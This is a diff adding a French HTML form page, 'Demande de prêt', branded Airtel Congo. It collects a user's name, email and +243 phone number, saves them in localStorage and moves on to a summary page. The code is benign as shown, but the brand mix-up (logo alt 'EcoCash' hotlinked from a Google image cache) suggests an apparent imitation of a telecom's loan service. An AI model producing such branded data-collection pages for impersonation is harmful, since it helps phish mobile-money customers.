@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel - Demande de prêt</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+
+        /* =========================
+           HEADER
+        ========================= */
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+
+            margin-bottom: 10px;
+
+            background: white;
+
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* BACK BUTTON */
+
+        .back-btn {
+            font-size: 28px;
+
+            background: none;
+            border: none;
+
+            cursor: pointer;
+
+            color: #333;
+
+            width: 40px;
+            height: 40px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            padding: 0;
+        }
+
+        /* LOGO */
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            width: auto;
+            height: 40px;
+
+            flex-shrink: 0;
+        }
+
+        .logo img {
+            width: 110px;
+            height: 40px;
+
+            object-fit: contain;
+            object-position: center;
+
+            display: block;
+        }
+
+        /* RIGHT SIDE SPACER */
+
+        .header-spacer {
+            width: 40px;
+            height: 40px;
+        }
+
+        /* =========================
+           MAIN CARD
+        ========================= */
+
+        .card {
+            background: white;
+
+            border-radius: 24px;
+
+            padding: 40px 30px;
+
+            width: 100%;
+            max-width: 480px;
+
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+
+            display: flex;
+            flex-direction: column;
+
+            overflow-y: auto;
+
+            flex: 1;
+
+            margin-bottom: 10px;
+        }
+
+        /* =========================
+           FORM TITLE
+        ========================= */
+
+        .form-title {
+            font-size: 28px;
+
+            font-weight: 700;
+
+            text-align: center;
+
+            margin-bottom: 20px;
+
+            color: #333;
+        }
+
+        /* =========================
+           PROGRESS BAR
+        ========================= */
+
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+
+            background: #e0e0e0;
+
+            border-radius: 3px;
+
+            margin: 30px auto;
+
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66%;
+
+            height: 100%;
+
+            background: linear-gradient(
+                to right,
+                #4361ee,
+                #7209b7
+            );
+        }
+
+        /* =========================
+           STEP TEXT
+        ========================= */
+
+        .step-text {
+            text-align: center;
+
+            color: #777;
+
+            font-size: 15px;
+
+            margin-bottom: 30px;
+        }
+
+        /* =========================
+           NAME GROUP
+        ========================= */
+
+        .name-group {
+            display: flex;
+
+            gap: 15px;
+
+            margin-bottom: 24px;
+        }
+
+        .name-group > div {
+            flex: 1;
+        }
+
+        /* =========================
+           FORM LABEL
+        ========================= */
+
+        .form-label {
+            display: block;
+
+            font-weight: 600;
+
+            color: #333;
+
+            margin-bottom: 8px;
+
+            font-size: 15px;
+        }
+
+        /* =========================
+           FORM INPUT
+        ========================= */
+
+        .form-input {
+            width: 100%;
+
+            padding: 16px;
+
+            border: 1px solid #ddd;
+
+            border-radius: 12px;
+
+            font-size: 16px;
+
+            transition: border 0.3s;
+
+            font-family: 'Inter', sans-serif;
+        }
+
+        .form-input:focus {
+            border-color: #4361ee;
+
+            outline: none;
+        }
+
+        .invalid {
+            border-color: #e74c3c !important;
+        }
+
+        /* =========================
+           PHONE GROUP
+        ========================= */
+
+        .phone-group {
+            display: flex;
+
+            align-items: center;
+
+            border: 1px solid #ddd;
+
+            border-radius: 12px;
+
+            padding: 0 16px;
+
+            margin-bottom: 10px;
+
+            transition: border 0.3s;
+
+            background: white;
+        }
+
+        .phone-group.invalid {
+            border-color: #e74c3c !important;
+        }
+
+        .phone-prefix {
+            color: #666;
+
+            font-size: 16px;
+
+            margin-right: 10px;
+
+            white-space: nowrap;
+        }
+
+        .phone-input {
+            flex: 1;
+
+            border: none;
+
+            outline: none;
+
+            padding: 16px 0;
+
+            font-size: 16px;
+
+            font-family: 'Inter', sans-serif;
+
+            min-width: 0;
+        }
+
+        .phone-input:focus {
+            outline: none;
+        }
+
+        /* =========================
+           PHONE HELP TEXT
+        ========================= */
+
+        .phone-help {
+            color: #999;
+
+            display: block;
+
+            margin-bottom: 30px;
+
+            font-size: 13px;
+        }
+
+        /* =========================
+           BUTTON GROUP
+        ========================= */
+
+        .btn-group {
+            display: flex;
+
+            gap: 15px;
+
+            margin-top: 40px;
+        }
+
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+
+            padding: 18px;
+
+            border: none;
+
+            border-radius: 50px;
+
+            font-size: 18px;
+
+            font-weight: 700;
+
+            cursor: pointer;
+
+            transition: opacity 0.2s ease,
+                        transform 0.2s ease;
+        }
+
+        /* PREVIOUS */
+
+        .prev-btn {
+            background: #eee;
+
+            color: #666;
+        }
+
+        .prev-btn:hover {
+            background: #e5e5e5;
+        }
+
+        /* NEXT */
+
+        .next-btn {
+            background: linear-gradient(
+                to right,
+                #4361ee,
+                #7209b7
+            );
+
+            color: white;
+        }
+
+        .next-btn:hover {
+            opacity: 0.92;
+        }
+
+        .prev-btn:active,
+        .next-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* =========================
+           FOOTER
+        ========================= */
+
+        footer {
+            padding: 20px;
+
+            color: #aaa;
+
+            font-size: 13px;
+
+            text-align: center;
+
+            width: 100%;
+
+            max-width: 480px;
+        }
+
+        /* =========================
+           MOBILE
+        ========================= */
+
+        @media (max-width: 480px) {
+
+            .logo {
+                height: 38px;
+            }
+
+            .logo img {
+                width: 100px;
+                height: 38px;
+            }
+
+            .card {
+                padding: 30px 20px;
+            }
+
+            .form-title {
+                font-size: 25px;
+            }
+
+            .name-group {
+                gap: 10px;
+            }
+
+            .form-input,
+            .phone-input {
+                font-size: 15px;
+            }
+
+            .prev-btn,
+            .next-btn {
+                font-size: 16px;
+                padding: 16px 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- HEADER -->
+
+    <header>
+
+        <button
+            class="back-btn"
+            onclick="history.back()"
+            aria-label="Retour"
+        >
+            ←
+        </button>
+
+        <div class="logo">
+
+            <img
+                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwKPIUOxpuuEY1j3YBezDsKGUqWQ8aZNoh7dFU4nzwiw&s=10"
+                alt="EcoCash"
+            >
+
+        </div>
+
+        <div class="header-spacer"></div>
+
+    </header>
+
+
+    <!-- MAIN CONTENT -->
+
+    <main class="card">
+
+        <h1 class="form-title">
+            Demande de prêt
+        </h1>
+
+
+        <!-- PROGRESS BAR -->
+
+        <div class="progress-bar">
+
+            <div class="progress-fill"></div>
+
+        </div>
+
+
+        <!-- STEP -->
+
+        <div class="step-text">
+            Étape 2 sur 3
+        </div>
+
+
+        <!-- FIRST AND LAST NAME -->
+
+        <div class="name-group">
+
+            <div>
+
+                <label
+                    class="form-label"
+                    for="firstName"
+                >
+                    Prénom
+                </label>
+
+                <input
+                    type="text"
+                    class="form-input"
+                    id="firstName"
+                    placeholder="Jean"
+                    autocomplete="given-name"
+                >
+
+            </div>
+
+
+            <div>
+
+                <label
+                    class="form-label"
+                    for="lastName"
+                >
+                    Nom
+                </label>
+
+                <input
+                    type="text"
+                    class="form-input"
+                    id="lastName"
+                    placeholder="Dupont"
+                    autocomplete="family-name"
+                >
+
+            </div>
+
+        </div>
+
+
+        <!-- EMAIL -->
+
+        <label
+            class="form-label"
+            for="email"
+        >
+            Adresse e-mail
+        </label>
+
+        <input
+            type="email"
+            class="form-input"
+            id="email"
+            placeholder="jean.dupont@example.com"
+            autocomplete="email"
+            style="margin-bottom:24px;"
+        >
+
+
+        <!-- PHONE -->
+
+        <label
+            class="form-label"
+            for="phone"
+        >
+            Numéro de téléphone
+        </label>
+
+
+        <div
+            class="phone-group"
+            id="phoneGroup"
+        >
+
+            <span class="phone-prefix">
+                +243
+            </span>
+
+            <input
+                type="tel"
+                class="phone-input"
+                id="phone"
+                placeholder="771234567"
+                maxlength="9"
+                inputmode="numeric"
+                autocomplete="tel"
+            >
+
+        </div>
+
+
+        <small class="phone-help">
+            Entrez 9 chiffres (ex. 771234567)
+        </small>
+
+
+        <!-- BUTTONS -->
+
+        <div class="btn-group">
+
+            <button
+                class="prev-btn"
+                onclick="history.back()"
+            >
+                PRÉCÉDENT
+            </button>
+
+
+            <button
+                class="next-btn"
+                id="nextBtn"
+            >
+                ÉTAPE SUIVANTE
+            </button>
+
+        </div>
+
+    </main>
+
+
+    <!-- FOOTER -->
+
+    <footer>
+© 2026 Airtel Congo. Tous droits réservés.
+    </footer>
+
+
+    <!-- JAVASCRIPT -->
+
+    <script>
+
+        /* =========================
+           PRE-FILL SAVED DATA
+        ========================= */
+
+        if (localStorage.getItem('firstName')) {
+
+            document.getElementById('firstName').value =
+                localStorage.getItem('firstName');
+
+        }
+
+
+        if (localStorage.getItem('lastName')) {
+
+            document.getElementById('lastName').value =
+                localStorage.getItem('lastName');
+
+        }
+
+
+        if (localStorage.getItem('email')) {
+
+            document.getElementById('email').value =
+                localStorage.getItem('email');
+
+        }
+
+
+        if (localStorage.getItem('phone')) {
+
+            document.getElementById('phone').value =
+                localStorage.getItem('phone');
+
+        }
+
+
+        /* =========================
+           NEXT BUTTON
+        ========================= */
+
+        document
+            .getElementById('nextBtn')
+            .addEventListener('click', function () {
+
+                const firstName =
+                    document
+                        .getElementById('firstName')
+                        .value
+                        .trim();
+
+
+                const lastName =
+                    document
+                        .getElementById('lastName')
+                        .value
+                        .trim();
+
+
+                const email =
+                    document
+                        .getElementById('email')
+                        .value
+                        .trim();
+
+
+                const phone =
+                    document
+                        .getElementById('phone')
+                        .value
+                        .trim();
+
+
+                /* REMOVE PREVIOUS ERRORS */
+
+                document
+                    .querySelectorAll(
+                        '.form-input, #phoneGroup'
+                    )
+                    .forEach(function (el) {
+
+                        el.classList.remove('invalid');
+
+                    });
+
+
+                let valid = true;
+
+
+                /* FIRST NAME */
+
+                if (!firstName) {
+
+                    document
+                        .getElementById('firstName')
+                        .classList.add('invalid');
+
+                    valid = false;
+                }
+
+
+                /* LAST NAME */
+
+                if (!lastName) {
+
+                    document
+                        .getElementById('lastName')
+                        .classList.add('invalid');
+
+                    valid = false;
+                }
+
+
+                /* EMAIL */
+
+                if (
+                    !email ||
+                    !email.includes('@') ||
+                    !email.includes('.')
+                ) {
+
+                    document
+                        .getElementById('email')
+                        .classList.add('invalid');
+
+                    valid = false;
+                }
+
+
+                /* PHONE */
+
+                if (
+                    !phone ||
+                    phone.length !== 9 ||
+                    !/^\d+$/.test(phone)
+                ) {
+
+                    document
+                        .getElementById('phoneGroup')
+                        .classList.add('invalid');
+
+                    valid = false;
+                }
+
+
+                /* SHOW VALIDATION ERROR */
+
+                if (!valid) {
+
+                    alert(
+                        'Veuillez remplir correctement tous les champs.\n\n' +
+                        '• L’adresse e-mail doit être valide\n' +
+                        '• Le numéro de téléphone doit contenir exactement 9 chiffres'
+                    );
+
+                    return;
+                }
+
+
+                /* =========================
+                   SAVE INFORMATION
+                ========================= */
+
+                localStorage.setItem(
+                    'firstName',
+                    firstName
+                );
+
+
+                localStorage.setItem(
+                    'lastName',
+                    lastName
+                );
+
+
+                localStorage.setItem(
+                    'email',
+                    email
+                );
+
+
+                localStorage.setItem(
+                    'phone',
+                    phone
+                );
+
+
+                /* =========================
+                   NEXT PAGE
+                ========================= */
+
+                window.location.href =
+                    'summary.html';
+
+            });
+
+    </script>
+
+</body>
+
+</html>
